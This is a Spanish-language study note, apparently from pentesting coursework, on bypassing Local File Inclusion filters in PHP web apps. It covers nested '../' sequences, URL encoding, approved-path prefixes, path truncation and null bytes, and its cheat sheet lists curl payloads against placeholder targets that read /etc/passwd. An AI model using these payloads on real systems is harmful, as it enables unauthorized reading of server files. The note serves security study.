---
tags:
  - webapp
  - LFI
  - bypass
---
## Conceptos Clave (TL;DR)

* Las aplicaciones web suelen aplicar protecciones contra Local File Inclusion (LFI) que, si no se implementan de forma robusta, pueden ser evadidas.

* Los filtros de reemplazo simples que eliminan la cadena `../` de forma no recursiva pueden evadirse usando secuencias anidadas (ej. `....//`) o alterando la sintaxis del directorio.

* El filtrado de caracteres específicos, como puntos o barras, se puede bypassear enviando el payload en formato URL encode o Double URL encode.

* Si el servidor valida que la ruta comience con un directorio permitido mediante expresiones regulares, es posible iniciar el payload con ese directorio y luego retroceder en el árbol de archivos.

* Las restricciones por extensiones forzadas (ej. la aplicación añade `.php` al final) pueden evadirse en versiones antiguas de PHP usando inyección de Null Bytes o provocando el truncamiento de la ruta (Path Truncation).


## Herramientas Clave

* **Burp Suite Decoder**: Útil para generar y decodificar payloads de LFI, particularmente para aplicar URL Encoding y Double URL Encoding a cadenas completas.

* **Bash (Command Line)**: Necesario para automatizar la generación de cadenas extremadamente largas, lo cual es requerido para ataques de ``Path Truncation``.


## Metodología Paso a Paso

### 1. Evasión de Filtros No Recursivos (Path Traversal Filters)

Si el servidor elimina `../` pero no lo hace de manera iterativa, debemos introducir secuencias que, tras el reemplazo inicial, formen el payload válido. Intentamos combinaciones que re-armen el `../` u opciones de barras adicionales.

  

### 2. Evasión mediante Encoding

Cuando la aplicación bloquea los caracteres `.` y `/`, codificamos el payload en formato URL. Es crítico asegurar que todos los caracteres sean codificados, incluidos los puntos, ya que algunos decodificadores los omiten. Si esto falla, intentamos aplicar doble codificación URL.

  

### 3. Evasión de Rutas Aprobadas (Approved Paths)

Si obtenemos errores de "ruta ilegal", debemos identificar qué ruta espera la aplicación interceptando el tráfico legítimo. Una vez identificada, prefijamos nuestro payload con esa ruta aprobada y luego ejecutamos el salto de directorios hacia la raíz.

  

### 4. Evasión de Extensión Añadida (Legacy PHP)

Si la aplicación adjunta una extensión (ej. `.php`) y el servidor corre una versión antigua de PHP, probamos dos vías:

* **Path Truncation (PHP < 5.3/5.4)**: Aprovecha el límite de 4096 caracteres de PHP truncando cualquier cosa que supere ese límite (en este caso, la extensión).

* **Null Byte (PHP < 5.5)**: Inyectamos el carácter `%00` al final del archivo deseado para que los lenguajes de bajo nivel terminen la lectura del string antes de la extensión.

  

## Cheat Sheet de Comandos

```bash
# Evasión de filtros no recursivos usando anidación (....// se convierte en ../)

curl -s "http://<TARGET_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd"

  
# Evasión de filtros no recursivos usando puntos y barras alteradas

curl -s "http://<TARGET_IP>:<PORT>/index.php?language=..././..././..././..././etc/passwd"

curl -s "http://<TARGET_IP>:<PORT>/index.php?language=....\/....\/....\/....\/etc/passwd"

curl -s "http://<TARGET_IP>:<PORT>/index.php?language=....////....////....////....////etc/passwd"

  
# Evasión mediante URL Encoding (%2e%2e%2f es ../)

curl -s "http://<TARGET_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64"

  
# Evasión de "Approved Paths" (Ejemplo donde ./languages/ es obligatorio)

curl -s "http://<TARGET_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd"

  
# Generador de payload para Path Truncation usando Bash (Rellena hasta 4096 caracteres)
# Requiere iniciar con un directorio no existente para que funcione correctamente

echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

  
# Evasión de extensión añadida mediante Null Byte (Solo aplicable a PHP < 5.5)

curl -s "http://<TARGET_IP>:<PORT>/index.php?language=/etc/passwd%00"
```

  

## "Gotchas" y Troubleshooting

* **Codificadores URL por defecto**: Muchos decodificadores/codificadores online no aplican el encode a los puntos (`.`) porque se consideran parte del esquema URL normal. Para LFI, es obligatorio codificarlos manualmente o usar Burp Suite.

* **Requisito de Path Truncation**: La ruta utilizada para rellenar los 4096 caracteres siempre debe comenzar apuntando a un directorio que **no exista**.

* **Obsolecencia de vulnerabilidades**: Null bytes (`%00`) y Path Truncation ya no funcionan en versiones modernas de PHP (reparado a partir de 5.3/5.4 y 5.5). En sistemas modernos, la única utilidad de estar forzado a una extensión es intentar leer código fuente de otros archivos dentro de la misma extensión esperada.

* **Múltiples filtros simultáneos**: Los desarrolladores pueden combinar protecciones (ej. Approved Paths + Filtros de caracteres). Es posible que necesites prefijar la ruta permitida y, acto seguido, utilizar un payload en formato URL Encoding o de evasión recursiva para lograr la inyección.